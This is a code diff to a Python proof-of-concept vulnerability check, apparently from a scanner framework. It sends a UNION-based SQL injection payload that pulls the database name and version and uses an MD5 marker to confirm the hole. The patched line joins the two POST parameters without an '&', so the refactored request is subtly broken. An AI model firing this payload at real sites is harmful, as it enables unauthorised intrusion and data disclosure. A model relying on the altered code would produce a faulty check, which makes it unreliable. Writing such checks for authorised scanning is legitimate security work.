@@ -37,9 +37,8 @@ class Poc(ABPoc):
             target_url=arg + payload
             post_v1="page=-1"
             post_v2="from_id=-1%20UNION%20ALL%20SELECT%20CONCAT_WS(CHAR(58),database(),version(),MD5(3.14)),NULL--%20&batch_size=-1%20"
-            code, head, res, _, _ = hh.http("-d %s&%s %s" % (post_v1,post_v2,target_url))
-                       
-            if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
+            res = requests.post(target_url, data=post_v1+post_v2)
+            if res.status_code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
